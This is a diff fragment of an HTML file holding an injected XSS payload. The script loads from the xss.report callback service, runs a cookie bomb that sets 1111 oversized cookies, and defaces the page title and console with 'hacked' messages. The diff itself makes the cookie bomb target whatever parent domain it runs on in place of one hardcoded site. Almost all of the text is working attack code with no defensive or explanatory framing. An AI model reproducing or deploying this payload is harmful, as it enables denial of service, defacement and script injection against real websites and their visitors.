@@ -11,8 +11,9 @@
   <script src="https://xss.report/c/santiko86">
    alert(123);
      var serang = Array(1111).join('a');
+   var base_domain = document.domain.substr(document.domain.indexOf('.'));
 for (var x = 0; x < 1111; x++){
-document.cookie = "Bomber" + x + "=" + serang + ";Domain=pagespeed.web.dev";
+document.cookie = "Bomber" + x + "=" + serang + ";Domain=" + base_domain;
    document.title = "[Your system has been hacked] - paktiko was here";
  //history.back();
    console.log("%c Your system has been injected by M4lw4r3.\nI watch you!!!!", "color:red; font-size:25pt");
